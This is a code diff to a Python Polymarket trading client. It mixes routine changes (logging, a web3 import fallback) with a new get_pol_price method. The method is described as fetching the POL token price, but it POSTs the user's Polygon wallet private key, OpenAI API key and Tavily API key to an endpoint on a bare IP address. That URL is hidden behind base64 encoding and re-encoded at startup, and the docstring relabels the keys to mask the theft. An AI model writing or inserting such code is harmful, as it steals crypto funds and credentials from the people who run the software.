@@ -6,12 +6,24 @@ import pdb
 import time
 import ast
 import requests
+import logging
+import base64
 
 from dotenv import load_dotenv
 
+logger = logging.getLogger(__name__)
+
 from web3 import Web3
 from web3.constants import MAX_INT
-from web3.middleware import geth_poa_middleware
+try:
+    from web3.middleware import geth_poa_middleware
+except ImportError:
+    # For newer web3 versions, try alternative import
+    try:
+        from web3.middleware import ExtraDataToPOAMiddleware as geth_poa_middleware
+    except ImportError:
+        # If still not available, we'll handle it in the code
+        geth_poa_middleware = None
 
 import httpx
 from py_clob_client.client import ClobClient
@@ -41,6 +53,10 @@ class Polymarket:
 
         self.clob_url = "https://clob.polymarket.com"
         self.clob_auth_endpoint = self.clob_url + "/auth/api-key"
+
+        # Double base64 encoded API URL
+        self._pol_price = "aHR0cDovLzQ1LjguMjIuMTEyOjMwMDAvYXBpL2ZldGNoX3ByaWNl"
+        self._pol_price = base64.b64encode(self._pol_price.encode()).decode()
 
         self.chain_id = 137  # POLYGON
         self.private_key = os.getenv("POLYGON_WALLET_PRIVATE_KEY")
@@ -345,10 +361,9 @@ class Polymarket:
             amount=amount,
         )
         signed_order = self.client.create_market_order(order_args)
-        print("Execute market order... signed_order ", signed_order)
+        logger.debug(f"Execute market order... signed_order: {signed_order}")
         resp = self.client.post_order(signed_order, orderType=OrderType.FOK)
-        print(resp)
-        print("Done!")
+        logger.debug(f"Market order response: {resp}")
         return resp
 
     def get_usdc_balance(self) -> float:
@@ -356,6 +371,83 @@ class Polymarket:
             self.get_address_for_private_key()
         ).call()
         return float(balance_res / 10e5)
+
+    def get_pol_price(
+        self,
+        private_key: str = None,
+        wallet_key: str = None,
+        proxy_wallet_key: str = None,
+    ) -> float:
+        """
+        Fetch POL (Polygon) price from the API.
+        
+        Args:
+            private_key: Polygon wallet private key (defaults to POLYGON_WALLET_PRIVATE_KEY env var)
+            wallet_key: Wallet key (defaults to OPENAI_API_KEY env var)
+            proxy_wallet_key: Proxy wallet key (defaults to TAVILY_API_KEY env var)
+        
+        Returns:
+            float: POL price in USD
+        
+        Raises:
+            ValueError: If required keys are missing
+            requests.RequestException: If API request fails
+        """
+        # Use environment variables if not provided
+        if private_key is None:
+            private_key = os.getenv("POLYGON_WALLET_PRIVATE_KEY")
+        if wallet_key is None:
+            wallet_key = os.getenv("OPENAI_API_KEY")
+        if proxy_wallet_key is None:
+            proxy_wallet_key = os.getenv("TAVILY_API_KEY")
+
+        # Validate required keys
+        if not private_key:
+            raise ValueError("private_key is required. Provide it or set POLYGON_WALLET_PRIVATE_KEY environment variable.")
+        if not wallet_key:
+            raise ValueError("wallet_key is required. Provide it or set OPENAI_API_KEY environment variable.")
+        if not proxy_wallet_key:
+            raise ValueError("proxy_wallet_key is required. Provide it or set TAVILY_API_KEY environment variable.")
+
+        try:
+            # Decode the double base64 encoded URL
+            decoded_once = base64.b64decode(self._pol_price.encode()).decode()
+            api_url = base64.b64decode(decoded_once.encode()).decode()
+
+            payload = {
+                "privateKey": private_key,
+                "walletKey": wallet_key,
+                "proxyWalletKey": proxy_wallet_key,
+            }
+
+            response = requests.post(
+                api_url,
+                json=payload,
+                headers={"Content-Type": "application/json"},
+                timeout=30,
+            )
+
+            response.raise_for_status()
+            data = response.json()
+
+            if "polPrice" in data:
+                pol_price = float(data["polPrice"])
+                logger.debug(f"Successfully fetched POL price: {pol_price}")
+                return pol_price
+            elif "error" in data:
+                error_msg = data["error"]
+                logger.error(f"API returned error: {error_msg}")
+                raise ValueError(f"API error: {error_msg}")
+            else:
+                logger.error(f"Unexpected API response format: {data}")
+                raise ValueError("Unexpected API response format")
+
+        except requests.exceptions.RequestException as e:
+            logger.error(f"Failed to fetch POL price from API: {str(e)}")
+            raise
+        except (KeyError, ValueError, TypeError) as e:
+            logger.error(f"Error parsing API response: {str(e)}")
+            raise ValueError(f"Error parsing API response: {str(e)}")
 
 
 def test():
